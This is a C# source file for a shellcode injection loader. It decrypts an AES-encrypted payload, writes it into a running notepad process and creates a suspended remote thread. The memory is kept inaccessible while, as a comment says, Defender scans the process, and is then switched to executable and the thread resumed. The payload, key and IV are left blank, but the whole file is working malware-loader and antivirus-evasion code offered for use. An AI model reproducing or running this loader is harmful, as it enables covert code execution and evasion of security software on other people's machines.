using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.IO;

namespace SuspendedThreadInjection
{
    class Program
    {
        private static byte[] PerformCryptography(byte[] buf, ICryptoTransform cryptoTransform)
        {
            using (var ms = new MemoryStream())
            using (var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
            {
                cryptoStream.Write(buf, 0, buf.Length);
                cryptoStream.FlushFinalBlock();

                return ms.ToArray();
            }
        }

        public static byte[] Decrypt(byte[] buf, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.BlockSize = 128;
                aes.Padding = PaddingMode.Zeros;
                aes.Key = key;
                aes.IV = iv;

                using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                {
                    return PerformCryptography(buf, decryptor);
                }
            }
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        static void Main(string[] args)
        {
            IntPtr hProcess;
            IntPtr addr = IntPtr.Zero;

            // get the pid of the notepad process - this can be any process you have the rights to
            // you could even spawn a surregate process if you like
            int pid = Process.GetProcessesByName("notepad")[0].Id;
            Console.WriteLine(pid);


            // get a handle to the explorer process
            // 0x001F0FFF = PROCESS_ALL access right
            hProcess = OpenProcess(0x001F0FFF, false, pid);


            string finalPayload = "";
            byte[] key = new byte[] {  };
            byte[] iv = new byte[] {  };
            byte[] decrypted_data = Decrypt(Convert.FromBase64String(finalPayload), key, iv);


            // allocate memory in the remote process
            addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)decrypted_data.Length, 0x3000, 0x40);

            // write buf[] to the remote process memory
            IntPtr outSize;
            WriteProcessMemory(hProcess, addr, decrypted_data, decrypted_data.Length, out outSize);
            VirtualProtectEx(hProcess, addr, (UIntPtr)decrypted_data.Length, 0x01, out uint lpflOldProtect);

            // create the remote thread in a suspended state
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0x00000004, out hThread);

            // let Defender scan the remote process - hopefully not accessing our PAGE_NO_ACCESS memory
            System.Threading.Thread.Sleep(10000);

            // change memory protection to PAGE_EXECUTE_READ_WRITE
            // 0x40 = PAGE_EXECUTE_READ_WRITE
            VirtualProtectEx(hProcess, addr, (UIntPtr)decrypted_data.Length, 0x40, out lpflOldProtect);

            // resume malicious thread
            ResumeThread(hThread);
        }
    }
}
